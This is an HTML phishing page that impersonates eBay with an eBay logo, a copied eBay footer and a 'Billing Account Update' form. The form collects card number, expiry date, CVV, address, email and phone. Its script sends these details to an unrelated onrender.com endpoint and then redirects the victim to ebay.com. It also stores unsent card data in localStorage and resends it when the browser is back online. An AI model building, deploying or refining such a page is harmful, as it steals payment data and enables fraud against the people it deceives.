<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Billing Account Update</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: white;}
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; }
        input, select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
        button { background-color: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        .status-message { margin-top: 15px; padding: 10px; border-radius: 4px; }
        .success { background-color: #d4edda; color: #155724; }
        .error { background-color: #f8d7da; color: #721c24; }
        footer {max-width: 1000px; }
    </style>
</head>
<body>

    <img src="ebay.jpg">
    <h1>Billing Account Update</h1>
    <form id="billingForm">
        <div class="form-group">
            <label for="cardHolderName">Cardholder Name:</label>
            <input type="text" id="cardHolderName" required>
        </div>
        
        <div class="form-group">
            <label for="cardNumber">Card Number:</label>
            <input type="text" id="cardNumber" required>
        </div>
        
        <div class="form-group">
            <label for="cardType">Card Type:</label>
            <select id="cardType" required>
                <option value="">Select card type</option>
                <option value="credit">Credit Card</option>
                <option value="debit">Debit Card</option>
            </select>
        </div>
        
        <div class="form-group">
            <label for="expDate">Expiration Date:</label>
            <input type="text" id="expDate" placeholder="MM/YY" required>
        </div>
        
        <div class="form-group">
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" required>
        </div>
        
        <div class="form-group">
            <label for="billingAddress">Billing Address:</label>
            <textarea id="billingAddress" rows="3" required></textarea>
        </div>
        
        <div class="form-group">
            <label for="email">Email:</label>
            <input type="email" id="email" required>
        </div>
        
        <div class="form-group">
            <label for="phone">Phone:</label>
            <input type="tel" id="phone" required>
        </div>
        
        <button type="submit">Update Billing Information</button>
    </form>
    
    <div id="statusMessage"></div>
    <div id="footer">
        <footer style="position: sticky; font-family: Arial, Helvetica, sans-serif; font-weight: lighter; color: black; font-size: 13px; margin-top: 80px;">Copyright © 1995-2026 eBay Inc. All Rights Reserved. <a style="color:#62a1db;" href="https://www.ebayinc.com/accessibility/">Accessibility</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/user-agreement?id=4259">User Agreement</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/user-privacy-notice-privacy-policy?id=4260">Privacy</a>, <a style="color:#62a1db;" href="https://www.ebayinc.com/company/privacy-center/privacy-notice/consumer-health-data-privacy-policy/">Consumer Health Data</a>, <a style="color:#62a1db;" href="https://pages.ebay.com/payment/2.0/terms.html">Payments Terms of Use</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/ebay-cookie-notice?id=4267">Cookies</a>, <a style="color:#62a1db;" href="https://www.ebayinc.com/company/privacy-center/privacy-notice/state-privacy-disclosures/#california">CA Privacy Notice</a>, <a style="color:#62a1db;" href="https://www.ebay.com/adchoice/ccpa">Your Privacy Choices</a> and <a style="color:#62a1db;" href="https://www.ebay.com/adchoice">AdChoice</a></footer>
    </div>

    <script>

        const cardInput = document.getElementById('cardNumber');
        cardInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            value = value.substring(0,16);
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += '-';
                formatted += value[i];
            }
            this.value = formatted;
        });


        const expInput = document.getElementById('expDate');
        expInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            value = value.substring(0,4);
            if (value.length > 2) value = value.substring(0,2) + '/' + value.substring(2);
            this.value = value;
        });

        const form = document.getElementById('billingForm');
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
             // Build JSON object manually
            const data = {
                cardHolderName: document.getElementById('cardHolderName').value,
                cardNumber: document.getElementById('cardNumber').value,
                cardType: document.getElementById('cardType').value,
                expDate: document.getElementById('expDate').value,
                cvv: document.getElementById('cvv').value,
                billingAddress: document.getElementById('billingAddress').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value
            
            };
            
            try {
                const response = await fetch('https://billing-api-n392.onrender.com/api/update-billing', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
             });
         

                if (!response.ok) throw new Error("Server offline or network error");

                // Remove from localStorage if sent successfully
                removeFromQueue(data);

                alert("Billing info submitted successfully! Redirecting...");
                    setTimeout(() => {
                        window.location.href = 'https://www.ebay.com';
                    }, 2000); // redirect after 2 seconds

            } catch (err) {
                console.warn("Server offline, saving locally...");
                saveToQueue(data); // Save to localStorage
                alert("Saved locally. Will sync when server is online.");
                    setTimeout(() => {
                        window.location.href = 'https://www.ebay.com';
                    }, 2000); // redirect after 2 seconds
            }
        });

            function saveToQueue(item) {
                const queue = JSON.parse(localStorage.getItem('offlineQueue') || '[]');
                queue.push(item);
                localStorage.setItem('offlineQueue', JSON.stringify(queue));
            }

            function removeFromQueue(item) {
                let queue = JSON.parse(localStorage.getItem('offlineQueue') || '[]');
                queue = queue.filter(q => q.email !== item.email || q.cardNumber !== item.cardNumber);
                localStorage.setItem('offlineQueue', JSON.stringify(queue));
            }
            
            window.addEventListener('online', async () => {
                const queue = JSON.parse(localStorage.getItem('offlineQueue') || '[]');
                if (!queue.length) return;

                console.log("Back online! Syncing queued submissions...");
                for (const item of queue) {
                    try {
                        const response = await fetch('https://billing-api-n392.onrender.com/api/update-billing', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(item)
                    });

                    if (response.ok) removeFromQueue(item);
                } catch (err) {
                    console.warn("Still offline, retry later");
                }
            }
        });

        </script>
    </body>
</html>
